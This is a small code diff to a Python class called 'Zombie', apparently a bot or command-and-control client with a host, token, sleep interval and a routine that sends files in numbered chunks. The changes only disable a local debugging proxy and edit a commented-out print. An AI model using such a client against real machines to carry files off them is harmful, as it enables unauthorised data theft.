@@ -12,7 +12,8 @@ class Zombie():
     token = ""
     host = "http://localhost:8080"
     sleep = ""
-    proxy = {"http":"http://localhost:8888/"}
+    #proxy = {"http":"http://localhost:8888/"}
+    proxy = {}
 
     def __init__(self):
         self.id = self.gen_id()
@@ -166,7 +167,7 @@ class Zombie():
             #print(f"SEND_FILE => toSend chunks:{len(toSend)}")
             #print(f"SEND_FILE => toSend data:{toSend}")
             for x in range(0,len(toSend)):
-                #print(f"IN FOR LOOP, LEN OF CHUNK: {len(toSend[x])}")
+                #print(f"[???] in FOR LOOP, LEN OF CHUNK: {len(toSend[x])}")
                 page = x+1
                 if x == (len(toSend) - 1):
                     page = "END"
